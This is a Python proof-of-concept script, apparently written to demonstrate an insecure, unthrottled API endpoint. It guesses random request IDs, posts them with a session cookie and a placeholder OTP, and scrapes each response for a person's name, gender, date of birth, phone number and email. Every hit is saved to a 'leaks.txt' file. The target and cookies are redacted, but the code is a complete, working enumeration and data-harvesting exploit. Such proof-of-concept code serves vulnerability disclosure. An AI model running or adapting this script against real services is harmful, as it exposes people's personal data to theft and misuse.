#This script is developed as a POC for exploiting insecure API endpoint with no-rate limiting
#Developed by Suneet Singh
#This Script require request, random and BeautifuSoup4 module to work; Use -- pip install -r requirements.txt -- to install dependencies.
#This script generates 7 digit random numbers and use those to find if a requester exists with that request number, If user exists it saves the information of that user in a text file.



import requests
import random
from bs4 import BeautifulSoup

def leakstore(requester_id,bename,gender,dob,mobilenum1,email):
    with open('E:/leaks.txt', 'a') as f:               #change the directory and file name accordingly
        f.write("\n__________________________________\n")
        f.write("requester ID = " + requester_id['value'] + '\n' + "requester Name =" + bename[
            'value'] + '\n' + "requester Gender = " + gender['value'] + '\n' + "requester D.O.B = " + dob[
                    'value'] + '\n' + "requester Phone Number = " + mobilenum1['value'] + '\n' + "requester Email = " +
                email['value'])
        f.write("\n__________________________________\n")

def exploited(reqid):

    url = 'https://redacted.com/vulnerable_endpoint'
    myobj = {'otp_method_call': '', 'req_id': reqid,'otp': '1','mobilenum1': '9999999999','otp_reference_no': '3123'}

    #print(reqid)

    x = requests.post(url, data = myobj, cookies = {"JSESSIONID": "CAXXXXXXXXXXXXXXXXXXXXXXXXXXX", "JhnsdSess": "YYYYYYY.YYYYYY.YYYY"} , headers={"Host": "redacted.com", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Referer": "https://redacted.com/gr_mobileweb.jsp", "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "100", "Origin": "https://redacted.com"})
    y = (x.text)
    soup = BeautifulSoup(y, 'html.parser')

    requester_id = soup.find('input',  attrs={"name": "req_id"})
    mobilenum1 = soup.find('input', attrs={"name": "mobilenum1"})
    #mobilenumber = soup.find('input', attrs={"name": "mobilenum2"})
    dob = soup.find('input', attrs={"name": "dateodbirth"})  #not_a_typo it was mentioned 'dateodbirth' in the web page
    gender = soup.find('input', attrs={"name": "gender"})
    bename = soup.find('input', attrs={"name": "requesterName"})
    email = soup.find('input', attrs={"name": "email"})

    print( requester_id,'\n',bename,'\n',gender,'\n',dob,'\n',mobilenum1,'\n',email,'\n')
    flag = requester_id
    if flag is not None:
        leakstore(requester_id,bename,gender,dob,mobilenum1,email)
    #print(requester_id['value'], '\n', bename['value'], '\n', gender['value'], '\n', dob['value'], '\n', mobilenum1['value'], '\n', email['value'], '\n')

    #print(y)
    #print("\n\n\n")
# Press the green button in the gutter to run the script.
if __name__ == '__main__':

    numberoftimes = int(input("Enter the number of results you want: \n"))
    for i in range(numberoftimes):
        reqid = random.randint(1000000,2000000)
        exploited(reqid)


